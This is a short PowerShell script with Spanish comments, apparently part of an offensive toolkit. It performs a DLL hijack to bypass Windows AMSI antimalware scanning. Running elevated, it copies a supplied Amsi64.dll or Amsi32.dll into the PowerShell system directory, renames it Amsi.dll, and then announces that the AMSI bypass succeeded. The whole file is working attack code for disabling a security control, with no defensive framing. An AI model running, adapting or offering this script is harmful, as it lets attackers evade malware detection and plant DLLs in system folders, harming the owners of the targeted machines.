Write-Host
Write-Host "Haciendo DLL Hijacking:"
try
{  
    #Path de ejecución del script
    $path_execution = Get-Location
    
    #path donde está PowerShell   
    $path_PS = "C:\Windows\System32\WindowsPowerShell\v1.0"

    #Comprobar si el sistema es de 32 o 64 bits
    
    if([Environment]::Is64BitProcess)
    {

        Start-Process PowerShell.exe -ArgumentList "-command Copy-Item -Force -Recurse '$path_execution\Amsi64.dll' '$path_PS' ; Rename-Item -Force '$path_PS\Amsi64.dll' '$path_PS\Amsi.dll'" -Verb runAs -Wait

    }
    else
    {

        Start-Process PowerShell.exe -ArgumentList "-command Copy-Item -Force -Recurse '$path_execution\Amsi32.dll' '$path_PS' ; Rename-Item -Force '$path_PS\Amsi32.dll' '$path_PS\Amsi.dll'" -Verb runAs -Wait

    }
    Write-Host
    Write-Host "---> AMSI bypass Conseguido!"-ForegroundColor Green -BackgroundColor DarkBlue
    Write-Host
    pause
    Clear-Host
}
catch
{
    Write-Host
    Write-Host "---> No ha funcionado, intente otro método" -ForegroundColor Red -BackgroundColor Yellow
    pause
    Clear-Host
}
break